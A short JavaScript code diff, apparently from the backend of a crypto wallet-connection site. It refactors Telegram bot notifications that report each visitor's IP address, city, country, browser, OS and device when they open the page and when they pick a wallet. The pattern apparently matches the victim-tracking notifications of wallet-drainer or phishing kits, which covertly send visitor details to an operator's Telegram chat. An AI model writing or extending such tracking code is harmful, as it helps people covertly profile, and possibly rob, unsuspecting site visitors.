@@ -59,15 +59,15 @@ export const main = async (server) => {
 
         await bot.telegram.sendMessage(chatId, `
 👤 *Пользователь*:
-- 🌐 *IP*: \`${clientData?.ip || 'N/A'}\`
-- 🏙️ *Город*: \`${clientData?.city || 'N/A'}\`
-- 🌎 *Страна*: \`${clientData?.country || 'N/A'}\`
+- 🌐 *IP*: \`${userData.client.ip || 'N/A'}\`
+- 🏙️ *Город*: \`${userData.client.city || 'N/A'}\`
+- 🌎 *Страна*: \`${userData.client.country || 'N/A'}\`
 
 📱 *Информация об устройстве*:
-- 🖥️ *User Agent*: \`${result.ua}\`
-- 🌐 *Браузер*: \`${result.browser.name}\`
-- 💻 *ОС*: \`${result.os.name}\`
-- 📱 *Устройство*: \`${deviceInfo}\`
+- 🖥️ *User Agent*: \`${userData.ua.ua}\`
+- 🌐 *Браузер*: \`${userData.ua.browser.name}\`
+- 💻 *ОС*: \`${userData.ua.os.name}\`
+- 📱 *Устройство*: ${deviceInfo}
 
 Открыл вкладку.
 `, { parse_mode: 'Markdown' });
@@ -89,7 +89,7 @@ export const main = async (server) => {
 - 🖥️ *User Agent*: \`${userData.ua.ua}\`
 - 🌐 *Браузер*: \`${userData.ua.browser.name}\`
 - 💻 *ОС*: \`${userData.ua.os.name}\`
-- 📱 *Устройство*: \`${userData.ua.device?.type || 'N/A'}\`, Модель: \`${userData.ua.device?.model || 'N/A'}\`, Производитель: \`${userData.ua.device?.vendor || 'N/A'}\`
+- 📱 *Устройство*: ${deviceInfo}
 
 Выбрал кошелек \`${wallet}\`.
 `, { parse_mode: 'Markdown' });
